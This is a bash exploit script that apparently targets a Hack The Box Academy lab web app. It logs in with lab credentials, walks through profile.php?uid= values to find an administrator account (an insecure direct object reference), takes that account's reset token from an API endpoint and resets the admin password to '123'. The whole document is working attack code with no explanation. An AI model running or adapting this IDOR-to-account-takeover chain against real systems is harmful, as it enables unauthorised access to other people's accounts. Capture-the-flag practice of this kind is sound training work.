#!/bin/bash

# Check and install jq if needed
if ! command -v jq &> /dev/null; then
    echo "[*] Installing jq..."
    if [[ -f /etc/debian_version ]]; then
        sudo apt update && sudo apt install -y jq
    elif [[ -f /etc/redhat-release ]]; then
        sudo yum install -y jq
    elif [[ "$OSTYPE" == "darwin"* ]]; then
        brew install jq
    else
        echo "[-] Please install jq manually and try again"
        exit 1
    fi
fi

# Target configuration
TARGET="http://94.237.55.43:50149"
LOGIN_URL="$TARGET/index.php"
CREDS="username=htb-student&password=Academy_student%21"
PASSWORD="123"  # Static password as requested

# Cookie management
COOKIE_FILE=$(mktemp)
trap 'rm -f "$COOKIE_FILE"' EXIT

# Authentication function
authenticate() {
    echo "[*] Authenticating..."
    curl -s -v -X POST "$LOGIN_URL" \
      -H "Content-Type: application/x-www-form-urlencoded" \
      -H "User-Agent: Mozilla/5.0" \
      -H "Referer: $TARGET/" \
      -d "$CREDS" \
      -c "$COOKIE_FILE" -b "$COOKIE_FILE" > /dev/null 2>&1

    if [ ! -s "$COOKIE_FILE" ] || ! grep -q "PHPSESSID" "$COOKIE_FILE"; then
      echo "[-] Authentication failed!"
      exit 1
    fi
    echo "[+] Authenticated successfully"
    echo -e "[*] Session Cookies:\n$(cat "$COOKIE_FILE" | grep -v '^#')"
}

# Admin detection function
find_admin() {
    echo -e "\n[*] Scanning for admin accounts..."
    local indicators=("admin" "role.*admin" "privilege.*1" "is_admin.*true")
    
    # Check common admin UIDs first
    for id in 1 0 2 100 99 7 10 13 24 50; do
        local response=$(curl -s -b "$COOKIE_FILE" "$TARGET/profile.php?uid=$id")
        local username=$(echo "$response" | grep -oP "username: \K.*")
        
        [[ -z "$username" ]] && continue
        
        for indicator in "${indicators[@]}"; do
            if echo "$response" | grep -qiE "$indicator"; then
                echo -e "\n[+] ADMIN DETECTED - UID $id: $username"
                echo "    Matched: $indicator"
                echo "    Profile Data:"
                echo "$response" | grep -E "username|role|privilege|admin" | sed 's/^/    /'
                ADMIN_UID=$id
                return 0
            fi
        done
    done

    # Full scan if not found
    echo "[*] Performing full scan (1-100)..."
    for id in {1..100}; do
        local response=$(curl -s -b "$COOKIE_FILE" "$TARGET/profile.php?uid=$id")
        local username=$(echo "$response" | grep -oP "username: \K.*")
        
        [[ -z "$username" ]] && continue
        
        for indicator in "${indicators[@]}"; do
            if echo "$response" | grep -qiE "$indicator"; then
                echo -e "\n[+] ADMIN DETECTED - UID $id: $username"
                echo "    Matched: $indicator"
                ADMIN_UID=$id
                return 0
            fi
        done
    done

    return 1
}

# Main execution
authenticate

if ! find_admin; then
    echo "[-] No admin account found!"
    exit 1
fi

# Token extraction
echo -e "\n[*] Extracting token for UID $ADMIN_UID..."
ADMIN_TOKEN=$(curl -s -b "$COOKIE_FILE" "$TARGET/api.php/token/$ADMIN_UID" | jq -r '.token')

if [[ -z "$ADMIN_TOKEN" || "$ADMIN_TOKEN" == "null" ]]; then
    echo "[-] Failed to get admin token"
    exit 1
fi

echo -e "[+] ADMIN TOKEN: $ADMIN_TOKEN"

# Password reset
echo -e "\n[*] Attempting password reset..."
reset_response=$(curl -s -v -b "$COOKIE_FILE" \
  "$TARGET/reset.php?uid=$ADMIN_UID&token=$ADMIN_TOKEN&password=$PASSWORD" 2>&1)

if echo "$reset_response" | grep -qi "success"; then
    echo -e "\n[+] PASSWORD RESET SUCCESSFUL!"
    echo "    Admin UID: $ADMIN_UID"
    echo "    Username: $(curl -s -b "$COOKIE_FILE" "$TARGET/profile.php?uid=$ADMIN_UID" | grep -oP "username: \K.*")"
    echo "    New Password: $PASSWORD"
    echo "    Admin Token: $ADMIN_TOKEN"
else
    echo -e "\n[-] Password reset failed. Server response:"
    echo "$reset_response" | head -n 20
fi
